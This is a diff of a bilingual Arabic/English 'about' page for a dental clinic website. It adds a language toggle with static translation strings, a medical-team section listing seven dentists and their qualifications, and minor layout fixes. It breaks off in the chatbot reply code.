@@ -2,13 +2,13 @@
 <html lang="ar" dir="rtl" class="scroll-smooth">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Glow Dental Clinic | عن العيادة</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title id="page-title">Glow Dental Clinic | عن العيادة</title>
+        
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Alexandria:wght@300;400;500;600;700&family=Playfair+Display:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
-    
+        
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -31,24 +31,33 @@
             }
         }
     </script>
+    <style>
+        html, body {
+            overflow-x: hidden;
+            width: 100%;
+        }
+    </style>
 </head>
-<body class="bg-brand-bg text-brand-primary font-sans antialiased selection:bg-brand-rose selection:text-white flex flex-col min-h-screen">
+<body class="bg-brand-bg text-brand-primary font-sans antialiased selection:bg-brand-rose selection:text-white flex flex-col min-h-screen w-full overflow-x-hidden">
 
     <header class="w-full py-3 px-6 md:px-12 flex justify-between items-center border-b border-stone-200/60 sticky top-0 bg-brand-bg/90 backdrop-blur-md z-50">
         <a href="index.html" class="flex items-center shrink-0">
             <img src="logo.png" alt="Glow Dental Clinic" class="h-24 md:h-28 w-auto min-w-[200px] object-cover">
         </a>
         
-        <nav class="hidden md:flex space-x-8 space-x-reverse text-sm font-medium text-stone-600 items-center">
-            <a href="index.html" class="hover:text-stone-900 transition-colors">الرئيسية</a>
-            <a href="about.html" class="text-stone-900 font-semibold border-b-2 border-brand-accent pb-1">عن العيادة</a>
-            <a href="services.html" class="hover:text-stone-900 transition-colors">الخدمات</a>
-            <a href="location.html" class="hover:text-stone-900 transition-colors">الموقع</a>
-            <a href="contact.html" class="hover:text-stone-900 transition-colors">التواصل</a>
+        <nav class="hidden md:flex space-x-8 space-x-reverse text-sm font-medium text-stone-600 items-center" id="desktop-nav">
+            <a href="index.html" class="hover:text-stone-900 transition-colors" data-i18n="nav_home">الرئيسية</a>
+            <a href="about.html" class="text-stone-900 font-semibold border-b-2 border-brand-accent pb-1" data-i18n="nav_about">عن العيادة</a>
+            <a href="services.html" class="hover:text-stone-900 transition-colors" data-i18n="nav_services">الخدمات</a>
+            <a href="location.html" class="hover:text-stone-900 transition-colors" data-i18n="nav_location">الموقع</a>
+            <a href="contact.html" class="hover:text-stone-900 transition-colors" data-i18n="nav_contact">التواصل</a>
         </nav>
         
         <div class="flex items-center gap-3">
-            <a href="booking.html" class="bg-stone-900 text-white text-xs md:text-sm px-6 py-3 rounded-full hover:bg-stone-800 transition-all shadow-sm shrink-0 flex items-center justify-center">
+            <button onclick="toggleLanguage()" class="bg-stone-200/70 hover:bg-stone-300/80 text-stone-800 text-xs px-3 py-2 rounded-full font-semibold transition-colors flex items-center gap-1">
+                🌐 <span id="lang-btn-text">EN</span>
+            </button>
+            <a href="booking.html" class="bg-stone-900 text-white text-xs md:text-sm px-6 py-3 rounded-full hover:bg-stone-800 transition-all shadow-sm shrink-0 flex items-center justify-center" data-i18n="btn_book">
                 حجز استشارة
             </a>
             <button id="mobile-menu-btn" onclick="toggleMobileMenu()" aria-label="القائمة" class="md:hidden p-2 rounded-lg text-stone-800 hover:bg-stone-200/60 focus:outline-none transition-colors">
@@ -61,21 +70,21 @@
 
     <div id="mobile-menu" class="md:hidden fixed inset-x-0 top-[73px] bg-brand-bg/95 backdrop-blur-md border-b border-stone-200/80 shadow-xl z-40 px-6 py-6 transition-all duration-300 ease-in-out opacity-0 -translate-y-4 pointer-events-none">
         <nav class="flex flex-col space-y-4 text-stone-700 font-medium text-sm">
-            <a href="index.html" class="hover:text-stone-900 pr-3 transition-colors">الرئيسية</a>
-            <a href="about.html" class="text-stone-900 font-semibold border-r-2 border-brand-accent pr-3">عن العيادة</a>
-            <a href="services.html" class="hover:text-stone-900 pr-3 transition-colors">الخدمات</a>
-            <a href="location.html" class="hover:text-stone-900 pr-3 transition-colors">الموقع</a>
-            <a href="contact.html" class="hover:text-stone-900 pr-3 transition-colors">التواصل</a>
+            <a href="index.html" class="hover:text-stone-900 pr-3 transition-colors" data-i18n="nav_home">الرئيسية</a>
+            <a href="about.html" class="text-stone-900 font-semibold border-r-2 border-brand-accent pr-3" data-i18n="nav_about">عن العيادة</a>
+            <a href="services.html" class="hover:text-stone-900 pr-3 transition-colors" data-i18n="nav_services">الخدمات</a>
+            <a href="location.html" class="hover:text-stone-900 pr-3 transition-colors" data-i18n="nav_location">الموقع</a>
+            <a href="contact.html" class="hover:text-stone-900 pr-3 transition-colors" data-i18n="nav_contact">التواصل</a>
         </nav>
     </div>
 
     <section class="py-16 px-8 md:px-16 max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-12 items-center">
         <div class="space-y-6">
-            <span class="text-xs uppercase tracking-widest px-3 py-1 bg-stone-200/70 rounded-full text-stone-700 font-semibold">جولة داخل العيادة</span>
-            <h2 class="text-3xl md:text-4xl font-light leading-tight text-stone-900">
+            <span class="text-xs uppercase tracking-widest px-3 py-1 bg-stone-200/70 rounded-full text-stone-700 font-semibold" data-i18n="tour_tag">جولة داخل العيادة</span>
+            <h2 class="text-3xl md:text-4xl font-light leading-tight text-stone-900" data-i18n="tour_title">
                 بيئة راقية ومجهزة بأحدث الأجهزة الطبية.
             </h2>
-            <p class="text-stone-600 font-light leading-relaxed">
+            <p class="text-stone-600 font-light leading-relaxed" data-i18n="tour_desc">
                 في Glow Dental Clinic حرصنا على تصميم كل شبر في العيادة ليكون مريحاً وعصرياً؛ بدءاً من منطقتي الاستراحة والضيافة، مروراً بغرفة التعقيم الخاصة والمجهزة بأحدث الإمكانيات، وحتى عيادات الكشف والتخطيط الرقمي بالحاسوب.
             </p>
         </div>
@@ -94,18 +103,113 @@
         <div class="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 text-center">
             <div class="bg-brand-bg p-8 rounded-2xl border border-stone-200/80">
                 <span class="text-2xl mb-3 block">🛡️</span>
-                <h4 class="text-lg font-medium text-stone-800 mb-2">غرفة تعقيم مستقلة</h4>
-                <p class="text-xs text-stone-600 font-light leading-relaxed">أعلى مستويات السلامة والأمان باستخدام أحدث تقنيات التعقيم الدقيق.</p>
+                <h4 class="text-lg font-medium text-stone-800 mb-2" data-i18n="feat_1_title">غرفة تعقيم مستقلة</h4>
+                <p class="text-xs text-stone-600 font-light leading-relaxed" data-i18n="feat_1_desc">أعلى مستويات السلامة والأمان باستخدام أحدث تقنيات التعقيم الدقيق.</p>
             </div>
             <div class="bg-brand-bg p-8 rounded-2xl border border-stone-200/80">
                 <span class="text-2xl mb-3 block">💻</span>
-                <h4 class="text-lg font-medium text-stone-800 mb-2">تخطيط رقمي متطور</h4>
-                <p class="text-xs text-stone-600 font-light leading-relaxed">تخطيط مسبق لحالات الزراعة والتقويم عبر الحاسوب لضمان أعلى دقة.</p>
+                <h4 class="text-lg font-medium text-stone-800 mb-2" data-i18n="feat_2_title">تخطيط رقمي متطور</h4>
+                <p class="text-xs text-stone-600 font-light leading-relaxed" data-i18n="feat_2_desc">تخطيط مسبق لحالات الزراعة والتقويم عبر الحاسوب لضمان أعلى دقة.</p>
             </div>
             <div class="bg-brand-bg p-8 rounded-2xl border border-stone-200/80">
                 <span class="text-2xl mb-3 block">☕</span>
-                <h4 class="text-lg font-medium text-stone-800 mb-2">استراحة مريحة</h4>
-                <p class="text-xs text-stone-600 font-light leading-relaxed">منطقة ضيافة مجهزة لتوفير أعلى مستويات الراحة لمرضانا وعائلاتهم.</p>
+                <h4 class="text-lg font-medium text-stone-800 mb-2" data-i18n="feat_3_title">استراحة مريحة</h4>
+                <p class="text-xs text-stone-600 font-light leading-relaxed" data-i18n="feat_3_desc">منطقة ضيافة مجهزة لتوفير أعلى مستويات الراحة لمرضانا وعائلاتهم.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Medical Team Section -->
+    <section class="py-20 px-6 md:px-16 max-w-7xl mx-auto">
+        <div class="text-center max-w-2xl mx-auto mb-16 space-y-3">
+            <span class="text-xs uppercase tracking-widest px-3 py-1 bg-stone-200/70 rounded-full text-stone-700 font-semibold" data-i18n="team_tag">النخبة الطبية</span>
+            <h2 class="text-3xl md:text-4xl font-light text-stone-900" data-i18n="team_title">فريق أطباء Glow Dental</h2>
+            <p class="text-sm text-stone-600 font-light" data-i18n="team_subtitle">مجموعة متميزة من الاستشاريين والأخصائيين الملتزمين بتقديم أعلى مستويات الرعاية الصحية لأسنانك.</p>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
+            <!-- Doctor Card 1 -->
+            <div class="bg-brand-card rounded-2xl overflow-hidden border border-stone-200/80 shadow-sm hover:shadow-md transition-all flex flex-col">
+                <div class="aspect-[4/5] bg-stone-300 relative overflow-hidden">
+                    <img src="doctors/dr-adham.jpg" alt="د. أدهم محمد" class="w-full h-full object-cover">
+                </div>
+                <div class="p-6 flex flex-col flex-grow text-center">
+                    <h3 class="text-lg font-bold text-stone-900" data-i18n="doc1_name">د. أدهم محمد</h3>
+                    <p class="text-xs text-brand-accent font-semibold mt-1 mb-2" data-i18n="doc1_title">مؤسس ومدير العيادة</p>
+                    <p class="text-xs text-stone-600 font-light leading-relaxed mt-auto" data-i18n="doc1_desc"></p>
+                </div>
+            </div>
+
+            <!-- Doctor Card 2 -->
+            <div class="bg-brand-card rounded-2xl overflow-hidden border border-stone-200/80 shadow-sm hover:shadow-md transition-all flex flex-col">
+                <div class="aspect-[4/5] bg-stone-300 relative overflow-hidden">
+                    <img src="doctors/dr-ahmed-ezzat.jpg" alt="د. أحمد عزت" class="w-full h-full object-cover">
+                </div>
+                <div class="p-6 flex flex-col flex-grow text-center">
+                    <h3 class="text-lg font-bold text-stone-900" data-i18n="doc2_name">د. أحمد عزت</h3>
+                    <p class="text-xs text-brand-accent font-semibold mt-1 mb-2" data-i18n="doc2_title">ماجستير جراحة اللثة وزراعة الأسنان</p>
+                    <p class="text-xs text-stone-600 font-light leading-relaxed mt-auto" data-i18n="doc2_desc"></p>
+                </div>
+            </div>
+
+            <!-- Doctor Card 3 -->
+            <div class="bg-brand-card rounded-2xl overflow-hidden border border-stone-200/80 shadow-sm hover:shadow-md transition-all flex flex-col">
+                <div class="aspect-[4/5] bg-stone-300 relative overflow-hidden">
+                    <img src="doctors/dr-mohamed-ali.jpg" alt="د. محمد علي" class="w-full h-full object-cover">
+                </div>
+                <div class="p-6 flex flex-col flex-grow text-center">
+                    <h3 class="text-lg font-bold text-stone-900" data-i18n="doc3_name">د. محمد علي</h3>
+                    <p class="text-xs text-brand-accent font-semibold mt-1 mb-2" data-i18n="doc3_title">ماجستير التركيبات والزراعة - جامعة القاهرة</p>
+                    <p class="text-xs text-stone-600 font-light leading-relaxed mt-auto" data-i18n="doc3_desc"></p>
+                </div>
+            </div>
+
+            <!-- Doctor Card 4 -->
+            <div class="bg-brand-card rounded-2xl overflow-hidden border border-stone-200/80 shadow-sm hover:shadow-md transition-all flex flex-col">
+                <div class="aspect-[4/5] bg-stone-300 relative overflow-hidden">
+                    <img src="doctors/dr-noura-saleh.jpg" alt="د. نورة صالح" class="w-full h-full object-cover">
+                </div>
+                <div class="p-6 flex flex-col flex-grow text-center">
+                    <h3 class="text-lg font-bold text-stone-900" data-i18n="doc4_name">د. نورة صالح</h3>
+                    <p class="text-xs text-brand-accent font-semibold mt-1 mb-2" data-i18n="doc4_title">دكتوراه تقويم الأسنان - جامعة القاهرة</p>
+                    <p class="text-xs text-stone-600 font-light leading-relaxed mt-auto" data-i18n="doc4_desc"></p>
+                </div>
+            </div>
+
+            <!-- Doctor Card 5 -->
+            <div class="bg-brand-card rounded-2xl overflow-hidden border border-stone-200/80 shadow-sm hover:shadow-md transition-all flex flex-col">
+                <div class="aspect-[4/5] bg-stone-300 relative overflow-hidden">
+                    <img src="doctors/dr-yumna-elqassas.jpg" alt="د. يمنى القصاص" class="w-full h-full object-cover">
+                </div>
+                <div class="p-6 flex flex-col flex-grow text-center">
+                    <h3 class="text-lg font-bold text-stone-900" data-i18n="doc5_name">د. يمنى القصاص</h3>
+                    <p class="text-xs text-brand-accent font-semibold mt-1 mb-2" data-i18n="doc5_title">الزمالة الإيطالية في زراعة الأسنان</p>
+                    <p class="text-xs text-stone-600 font-light leading-relaxed mt-auto" data-i18n="doc5_desc"></p>
+                </div>
+            </div>
+
+            <!-- Doctor Card 6 -->
+            <div class="bg-brand-card rounded-2xl overflow-hidden border border-stone-200/80 shadow-sm hover:shadow-md transition-all flex flex-col">
+                <div class="aspect-[4/5] bg-stone-300 relative overflow-hidden">
+                    <img src="doctors/dr-ibrahim-attia.jpg" alt="د. إبراهيم عطية" class="w-full h-full object-cover">
+                </div>
+                <div class="p-6 flex flex-col flex-grow text-center">
+                    <h3 class="text-lg font-bold text-stone-900" data-i18n="doc6_name">د. إبراهيم عطية</h3>
+                    <p class="text-xs text-brand-accent font-semibold mt-1 mb-2" data-i18n="doc6_title">الزمالة الإيطالية في زراعة الأسنان</p>
+                    <p class="text-xs text-stone-600 font-light leading-relaxed mt-auto" data-i18n="doc6_desc"></p>
+                </div>
+            </div>
+
+            <!-- Doctor Card 7 -->
+            <div class="bg-brand-card rounded-2xl overflow-hidden border border-stone-200/80 shadow-sm hover:shadow-md transition-all flex flex-col">
+                <div class="aspect-[4/5] bg-stone-300 relative overflow-hidden">
+                    <img src="doctors/dr-yara-adel.jpg" alt="د. يارا عادل" class="w-full h-full object-cover">
+                </div>
+                <div class="p-6 flex flex-col flex-grow text-center">
+                    <h3 class="text-lg font-bold text-stone-900" data-i18n="doc7_name">د. يارا عادل</h3>
+                    <p class="text-xs text-brand-accent font-semibold mt-1 mb-2" data-i18n="doc7_title">أخصائية العلاج التحفظي وتجميل الأسنان</p>
+                    <p class="text-xs text-stone-600 font-light leading-relaxed mt-auto" data-i18n="doc7_desc"></p>
+                </div>
             </div>
         </div>
     </section>
@@ -116,23 +220,23 @@
             <div class="space-y-3">
                 <p class="font-bold text-xl tracking-wider uppercase">Glow Dental Clinic</p>
                 <p class="text-xs text-stone-400 leading-relaxed">YOUR GLOW IS YOUR SIGNATURE</p>
-                <p class="text-xs text-stone-400 leading-relaxed">عيادة تخصصية تقدم أفضل خدمات رعاية وتجميل الأسنان بأحدث التقنيات الطبية.</p>
+                <p class="text-xs text-stone-400 leading-relaxed" data-i18n="footer_about">عيادة تخصصية تقدم أفضل خدمات رعاية وتجميل الأسنان بأحدث التقنيات الطبية.</p>
             </div>
 
             <div class="space-y-3">
-                <h3 class="text-lg font-bold text-white tracking-wide">روابط سريعة</h3>
+                <h3 class="text-lg font-bold text-white tracking-wide" data-i18n="footer_quick_links">روابط سريعة</h3>
                 <ul class="space-y-2 text-sm text-stone-300 font-medium">
-                    <li><a href="index.html" class="hover:text-brand-accent transition-colors block py-0.5">الرئيسية</a></li>
-                    <li><a href="about.html" class="hover:text-brand-accent transition-colors block py-0.5">عن العيادة</a></li>
-                    <li><a href="services.html" class="hover:text-brand-accent transition-colors block py-0.5">الخدمات</a></li>
-                    <li><a href="location.html" class="hover:text-brand-accent transition-colors block py-0.5">الموقع</a></li>
-                    <li><a href="contact.html" class="hover:text-brand-accent transition-colors block py-0.5">التواصل</a></li>
-                    <li><a href="booking.html" class="hover:text-brand-accent transition-colors block py-0.5 text-brand-accent font-semibold">حجز استشارة</a></li>
+                    <li><a href="index.html" class="hover:text-brand-accent transition-colors block py-0.5" data-i18n="nav_home">الرئيسية</a></li>
+                    <li><a href="about.html" class="hover:text-brand-accent transition-colors block py-0.5" data-i18n="nav_about">عن العيادة</a></li>
+                    <li><a href="services.html" class="hover:text-brand-accent transition-colors block py-0.5" data-i18n="nav_services">الخدمات</a></li>
+                    <li><a href="location.html" class="hover:text-brand-accent transition-colors block py-0.5" data-i18n="nav_location">الموقع</a></li>
+                    <li><a href="contact.html" class="hover:text-brand-accent transition-colors block py-0.5" data-i18n="nav_contact">التواصل</a></li>
+                    <li><a href="booking.html" class="hover:text-brand-accent transition-colors block py-0.5 text-brand-accent font-semibold" data-i18n="btn_book">حجز استشارة</a></li>
                 </ul>
             </div>
 
             <div class="space-y-3">
-                <h3 class="text-lg font-bold text-white tracking-wide">تابعنا</h3>
+                <h3 class="text-lg font-bold text-white tracking-wide" data-i18n="footer_follow">تابعنا</h3>
                 <div class="flex items-center gap-4 pt-1">
                     <a href="https://www.facebook.com/1181129205081995?ref=PROFILE_EDIT_xav_ig_profile_page_web" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-full bg-stone-800 hover:bg-brand-accent hover:text-stone-900 flex items-center justify-center transition-colors" aria-label="Facebook">
                         <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24">
@@ -146,10 +250,8 @@
                     </a>
                 </div>
             </div>
-
         </div>
-
-        <div class="max-w-7xl mx-auto border-t border-stone-800 mt-10 pt-6 text-center text-stone-500 text-xs">
+        <div class="max-w-7xl mx-auto border-t border-stone-800 mt-10 pt-6 text-center text-stone-500 text-xs" data-i18n="footer_rights">
             © 2026 Glow Dental Clinic. جميع الحقوق محفوظة.
         </div>
     </footer>
@@ -167,7 +269,7 @@
             <svg class="w-6 h-6 text-brand-accent" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path>
             </svg>
-            <span class="text-xs font-semibold">مساعد Glow الذكي</span>
+            <span class="text-xs font-semibold" data-i18n="chat_btn">مساعد Glow الذكي</span>
         </button>
 
         <div id="chatbot-window" class="hidden fixed bottom-24 right-6 w-[340px] md:w-[380px] bg-white rounded-3xl shadow-2xl border border-stone-200 overflow-hidden flex flex-col z-50 transition-all duration-300">
@@ -177,9 +279,9 @@
                         ✨
                     </div>
                     <div>
-                        <h4 class="text-sm font-semibold">مساعد Glow الطبي</h4>
+                        <h4 class="text-sm font-semibold" data-i18n="chat_header">مساعد Glow الطبي</h4>
                         <p class="text-[10px] text-emerald-400 flex items-center gap-1">
-                            <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block"></span> متواجد حالياً لخدمتك
+                            <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block"></span> <span data-i18n="chat_online">متواجد حالياً لخدمتك</span>
                         </p>
                     </div>
                 </div>
@@ -190,7 +292,7 @@
 
             <div id="chat-messages" class="p-4 h-[300px] overflow-y-auto space-y-3 bg-stone-50/50 text-xs">
                 <div class="flex items-start gap-2">
-                    <div class="bg-stone-200/80 text-stone-800 p-3 rounded-2xl rounded-tr-none max-w-[85%] leading-relaxed">
+                    <div class="bg-stone-200/80 text-stone-800 p-3 rounded-2xl rounded-tr-none max-w-[85%] leading-relaxed" id="chat-welcome">
                         أهلاً بك في **Glow Dental Clinic**! 🦷<br/>
                         كيف يمكنني مساعدتك اليوم؟ يمكنك اختيار إحدى الأزرار بالأسفل:
                     </div>
@@ -198,16 +300,16 @@
             </div>
 
             <div class="p-3 bg-white border-t border-stone-100 grid grid-cols-2 gap-2 text-[11px]">
-                <button onclick="sendQuickReply('مواعيد العمل')" class="bg-brand-bg hover:bg-brand-card text-stone-700 py-2 px-3 rounded-xl border border-stone-200/80 text-right font-medium transition-colors">
+                <button onclick="sendQuickReply('مواعيد العمل')" class="bg-brand-bg hover:bg-brand-card text-stone-700 py-2 px-3 rounded-xl border border-stone-200/80 text-right font-medium transition-colors" data-i18n="chat_q1">
                     🕒 مواعيد العمل
                 </button>
-                <button onclick="sendQuickReply('موقع العيادة')" class="bg-brand-bg hover:bg-brand-card text-stone-700 py-2 px-3 rounded-xl border border-stone-200/80 text-right font-medium transition-colors">
+                <button onclick="sendQuickReply('موقع العيادة')" class="bg-brand-bg hover:bg-brand-card text-stone-700 py-2 px-3 rounded-xl border border-stone-200/80 text-right font-medium transition-colors" data-i18n="chat_q2">
                     📍 موقع العيادة
                 </button>
-                <button onclick="sendQuickReply('الخدمات والأسعار')" class="bg-brand-bg hover:bg-brand-card text-stone-700 py-2 px-3 rounded-xl border border-stone-200/80 text-right font-medium transition-colors">
+                <button onclick="sendQuickReply('الخدمات والأسعار')" class="bg-brand-bg hover:bg-brand-card text-stone-700 py-2 px-3 rounded-xl border border-stone-200/80 text-right font-medium transition-colors" data-i18n="chat_q3">
                     ✨ الخدمات والأسعار
                 </button>
-                <button onclick="sendQuickReply('حجز موعد')" class="bg-stone-900 hover:bg-stone-800 text-white py-2 px-3 rounded-xl text-right font-medium transition-colors">
+                <button onclick="sendQuickReply('حجز موعد')" class="bg-stone-900 hover:bg-stone-800 text-white py-2 px-3 rounded-xl text-right font-medium transition-colors" data-i18n="chat_q4">
                     📅 حجز موعد كشف
                 </button>
             </div>
@@ -215,6 +317,147 @@
     </div>
 
     <script>
+        const translations = {
+            ar: {
+                page_title: "Glow Dental Clinic | عن العيادة",
+                nav_home: "الرئيسية",
+                nav_about: "عن العيادة",
+                nav_services: "الخدمات",
+                nav_location: "الموقع",
+                nav_contact: "التواصل",
+                btn_book: "حجز استشارة",
+                tour_tag: "جولة داخل العيادة",
+                tour_title: "بيئة راقية ومجهزة بأحدث الأجهزة الطبية.",
+                tour_desc: "في Glow Dental Clinic حرصنا على تصميم كل شبر في العيادة ليكون مريحاً وعصرياً؛ بدءاً من منطقتي الاستراحة والضيافة، مروراً بغرفة التعقيم الخاصة والمجهزة بأحدث الإمكانيات، وحتى عيادات الكشف والتخطيط الرقمي بالحاسوب.",
+                feat_1_title: "غرفة تعقيم مستقلة",
+                feat_1_desc: "أعلى مستويات السلامة والأمان باستخدام أحدث تقنيات التعقيم الدقيق.",
+                feat_2_title: "تخطيط رقمي متطور",
+                feat_2_desc: "تخطيط مسبق لحالات الزراعة والتقويم عبر الحاسوب لضمان أعلى دقة.",
+                feat_3_title: "استراحة مريحة",
+                feat_3_desc: "منطقة ضيافة مجهزة لتوفير أعلى مستويات الراحة لمرضانا وعائلاتهم.",
+                team_tag: "النخبة الطبية",
+                team_title: "فريق أطباء Glow Dental",
+                team_subtitle: "مجموعة متميزة من الاستشاريين والأخصائيين الملتزمين بتقديم أعلى مستويات الرعاية الصحية لأسنانك.",
+                doc1_name: "د. أدهم محمد",
+                doc1_title: "مؤسس ومدير العيادة",
+                doc1_desc: "إشراف عام وضمان تقديم أفضل معايير الجودة والرعاية الرائدة.",
+                doc2_name: "د. أحمد عزت",
+                doc2_title: "ماجستير جراحة اللثة وزراعة الأسنان",
+                doc2_desc: "متخصص في علاج أمراض اللثة المعقدة وزراعة الأسنان الدقيقة.",
+                doc3_name: "د. محمد علي",
+                doc3_title: "ماجستير التركيبات والزراعة - جامعة القاهرة",
+                doc3_desc: "خبير في التركيبات الثابتة والتجميلية والحلول التعويضية المتقدمة.",
+                doc4_name: "د. نورة صالح",
+                doc4_title: "دكتوراه تقويم الأسنان - جامعة القاهرة",
+                doc4_desc: "متخصصة في تقويم الأسنان الشفاف والتقليدي لتنسيق الابتسامة.",
+                doc5_name: "د. يمنى القصاص",
+                doc5_title: "الزمالة الإيطالية في زراعة الأسنان",
+                doc5_desc: "أخصائية زراعة وتجميل الأسنان وفق التقنيات الأوروبية الحديثة.",
+                doc6_name: "د. إبراهيم عطية",
+                doc6_title: "الزمالة الإيطالية في زراعة الأسنان",
+                doc6_desc: "متخصص في جراحة وزراعة الأسنان وتأهيل الفكين المتقدم.",
+                doc7_name: "د. يارا عادل",
+                doc7_title: "أخصائية العلاج التحفظي وتجميل الأسنان",
+                doc7_desc: "متخصصة في الحشوات التجميلية والعلاج الوقائي وصحة الأسنان.",
+                footer_about: "عيادة تخصصية تقدم أفضل خدمات رعاية وتجميل الأسنان بأحدث التقنيات الطبية.",
+                footer_quick_links: "روابط سريعة",
+                footer_follow: "تابعنا",
+                footer_rights: "© 2026 Glow Dental Clinic. جميع الحقوق محفوظة.",
+                chat_btn: "مساعد Glow الذكي",
+                chat_header: "مساعد Glow الطبي",
+                chat_online: "متواجد حالياً لخدمتك",
+                chat_welcome: "أهلاً بك في **Glow Dental Clinic**! 🦷<br/>كيف يمكنني مساعدتك اليوم؟ يمكنك اختيار إحدى الأزرار بالأسفل:",
+                chat_q1: "🕒 مواعيد العمل",
+                chat_q2: "📍 موقع العيادة",
+                chat_q3: "✨ الخدمات والأسعار",
+                chat_q4: "📅 حجز موعد كشف"
+            },
+            en: {
+                page_title: "Glow Dental Clinic | About Us",
+                nav_home: "Home",
+                nav_about: "About Us",
+                nav_services: "Services",
+                nav_location: "Location",
+                nav_contact: "Contact",
+                btn_book: "Book Consultation",
+                tour_tag: "CLINIC TOUR",
+                tour_title: "A Premium Environment Equipped with Cutting-Edge Medical Tech.",
+                tour_desc: "At Glow Dental Clinic, every detail is thoughtfully designed for your comfort and safety — from our serene waiting lounges to our dedicated sterilization suite and computer-guided digital treatment rooms.",
+                feat_1_title: "Sterilization Suite",
+                feat_1_desc: "Uncompromising safety standards using state-of-the-art sterilization technology.",
+                feat_2_title: "Digital Treatment Planning",
+                feat_2_desc: "Computer-guided planning for implants and orthodontics ensuring maximum precision.",
+                feat_3_title: "Comfortable Lounge",
+                feat_3_desc: "A welcoming environment designed for the relaxation of our patients and families.",
+                team_tag: "MEDICAL ELITE",
+                team_title: "Meet Our Specialists",
+                team_subtitle: "A highly qualified team of consultants and specialists dedicated to deliver world-class dental care.",
+                doc1_name: "Dr. Adham Mohamed",
+                doc1_title: "Founder & Clinic Director",
+                doc1_desc: "Leading our clinical excellence and ensuring premium patient care standards.",
+                doc2_name: "Dr. Ahmed Ezzat",
+                doc2_title: "M.Sc. Periodontology & Dental Implants",
+                doc2_desc: "Specialized in advanced periodontal therapy and precise dental implant surgery.",
+                doc3_name: "Dr. Mohamed Ali",
+                doc3_title: "M.Sc. Prosthodontics & Implants - Cairo University",
+                doc3_desc: "Expert in aesthetic restorations, fixed prosthetics, and implant solutions.",
+                doc4_name: "Dr. Noura Saleh",
+                doc4_title: "Ph.D. Orthodontics - Cairo University",
+                doc4_desc: "Specialist in clear aligners and conventional orthodontics for perfectly aligned smiles.",
+                doc5_name: "Dr. Yumna Elqassas",
+                doc5_title: "Italian Fellowship in Implantology",
+                doc5_desc: "Specialist in modern dental implants and cosmetic restorations.",
+                doc6_name: "Dr. Ibrahim Attia",
+                doc6_title: "Italian Fellowship in Implantology",
+                doc6_desc: "Expert in complex oral surgery, dental implants, and full-mouth rehabilitation.",
+                doc7_name: "Dr. Yara Adel",
+                doc7_title: "Restorative & Cosmetic Dentistry Specialist",
+                doc7_desc: "Focused on aesthetic composite restorations, preventive dentistry, and smile design.",
+                footer_about: "A specialized dental center offering top-tier cosmetic and restorative dental treatments with advanced technologies.",
+                footer_quick_links: "Quick Links",
+                footer_follow: "Follow Us",
+                footer_rights: "© 2026 Glow Dental Clinic. All rights reserved.",
+                chat_btn: "Glow Smart Assistant",
+                chat_header: "Glow Medical Assistant",
+                chat_online: "Online & ready to help",
+                chat_welcome: "Welcome to **Glow Dental Clinic**! 🦷<br/>How can I assist you today? Feel free to choose an option below:",
+                chat_q1: "🕒 Working Hours",
+                chat_q2: "📍 Clinic Location",
+                chat_q3: "✨ Services & Pricing",
+                chat_q4: "📅 Book Appointment"
+            }
+        };
+
+        let currentLang = 'ar';
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'ar' ? 'en' : 'ar';
+            document.documentElement.lang = currentLang;
+            document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+
+            // Desktop navigation spacing fix for LTR/RTL
+            const desktopNav = document.getElementById('desktop-nav');
+            if (currentLang === 'en') {
+                desktopNav.classList.remove('space-x-reverse');
+            } else {
+                desktopNav.classList.add('space-x-reverse');
+            }
+
+            // Update language toggle button label
+            document.getElementById('lang-btn-text').textContent = currentLang === 'ar' ? 'EN' : 'عربي';
+
+            // Update text content of elements with data-i18n attribute
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (translations[currentLang][key]) {
+                    el.innerHTML = translations[currentLang][key];
+                }
+            });
+
+            // Update Page Title
+            document.getElementById('page-title').textContent = translations[currentLang].page_title;
+        }
+
         function toggleMobileMenu() {
             const menu = document.getElementById('mobile-menu');
             const icon = document.getElementById('menu-icon');
@@ -249,14 +492,26 @@
 
             setTimeout(() => {
                 let replyText = '';
-                if(option === 'مواعيد العمل') {
-                    replyText = 'نستقبلكم يومياً من الساعة 2 ظهراً حتى 10 مساءً (بالحجز المسبق لضمان عدم الانتظار).';
-                } else if(option === 'موقع العيادة') {
-                    replyText = 'عنواننا: الدقي، الجيزة - 20 شارع الثورة، الدور الرابع.<br/><a href="location.html" class="underline text-brand-accent font-semibold mt-1 inline-block">اضغط هنا لرؤية الخريطة والتفاصيل</a>';
-                } else if(option === 'الخدمات والأسعار') {
-                    replyText = 'نوفر خدمات: ابتسامة هوليود، زراعة وتقويم الأسنان، والتبييض والتنظيف. تختلف التكلفة بحسب الحالة بعد الفحص والتصوير.';
-                } else if(option === 'حجز موعد') {
-                    replyText = 'يمكنك اختيار الموعد المناسب لك مباشرة عبر صفحة الحجز:<br/><a href="booking.html" class="inline-block mt-2 bg-stone-900 text-white px-4 py-1.5 rounded-lg text-[10px]">الذهاب لصفحة الحجز 📅</a>';
+                if(currentLang === 'ar') {
+                    if(option === 'مواعيد العمل' || option.includes('Working')) {
